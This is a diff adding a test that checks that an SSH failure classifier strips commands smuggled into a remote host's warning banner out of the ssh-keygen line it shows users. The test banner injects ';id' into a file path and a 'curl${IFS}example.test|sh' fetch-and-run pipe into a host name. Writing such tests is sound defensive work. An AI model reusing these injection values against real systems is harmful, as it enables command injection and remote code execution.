@@ -218,3 +218,16 @@ test('ssh failures read as sentences about the machine', () => {
   assert.equal(read('something else\n').code, 'unknown')
   for (const text of Object.values(STDERR)) assert.match(read(text).message, /build-box/u)
 })
+
+test("a remote's banner cannot put a command into the ssh-keygen line a person copies", () => {
+  const banner =
+    '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n' +
+    '@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @\n' +
+    'Offending ECDSA key in /tmp/x;id:3\n' +
+    'Host key for build-box;curl${IFS}example.test|sh has changed and you have requested strict checking.\n'
+  const failure = classifySshFailure(banner, 'build-box')
+  assert.equal(failure.code, 'host-key-changed')
+  assert.doesNotMatch(failure.message, /curl|;id/u)
+  assert.match(failure.message, /ssh-keygen -R <its host name>/u)
+  assert.match(failure.message, /your known_hosts file/u)
+})
